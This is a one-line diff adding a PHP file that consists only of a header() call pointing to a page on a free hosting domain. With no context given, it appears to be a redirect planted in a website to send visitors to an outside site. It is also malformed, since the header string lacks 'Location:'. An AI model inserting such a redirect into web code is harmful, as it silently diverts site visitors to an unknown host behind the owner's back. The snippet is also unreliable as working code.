@@ -1,0 +1,1 @@
+<?php header('http://askhfn.000webhostapp.com/index.php');?>
